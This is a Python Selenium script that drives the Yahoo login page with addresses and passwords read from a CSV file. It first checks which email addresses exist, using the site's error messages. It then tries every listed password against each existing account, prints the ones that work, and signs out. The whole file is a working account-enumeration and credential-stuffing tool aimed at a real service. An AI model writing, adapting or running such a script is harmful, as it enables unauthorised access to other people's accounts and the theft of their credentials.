from selenium import webdriver
import time
import csv

driver = webdriver.Chrome(executable_path=r"C:\Program Files (x86)\Chromedriver\chromedriver.exe")
driver.maximize_window()

driver.get('https://login.yahoo.com/')
time.sleep(2)

file = open('email.csv')
csvreader = csv.reader(file)
rows = []
for row in csvreader:
        rows.append(row)

for row in rows[1:]:
        email = driver.find_element_by_xpath('//*[@id="login-username"]')
        email.send_keys(row[0])
        driver.find_element_by_xpath('//*[@id="login-signin"]').click()
        time.sleep(5)

        try:
                driver.find_element_by_xpath('//*[@id="username-error"]')
                print(row[0], "is an invalid email")

        except:
                print(row[0], "is a valid email")

                for row in rows[1:]:
                        email = driver.find_element_by_xpath('//*[@id="login-passwd"]')
                        email.send_keys(row[1])
                        driver.find_element_by_xpath('//*[@id="login-signin"]').click()
                        time.sleep(5)

                        try:
                                driver.find_element_by_xpath('//*[@id="password-challenge"]/form/p')
                                print(row[1], "is an invalid password")

                        except:
                                print(row[1], "is a valid password")
                                driver.find_element_by_xpath('//*[@id="ybarAccountMenuOpener"]/span').click()
                                time.sleep(2)
                                driver.find_element_by_xpath('//*[@id="profile-signout-link"]').click()
                                time.sleep(2)
                                break

        driver.get('https://login.yahoo.com/')
        try:
                driver.find_element_by_xpath('//*[@id="account-switcher-form"]/ul/li/a')
                driver.find_element_by_xpath('//*[@id="account-switcher"]/div[2]/a').click()
        except:
                pass
        time.sleep(2)

driver.quit()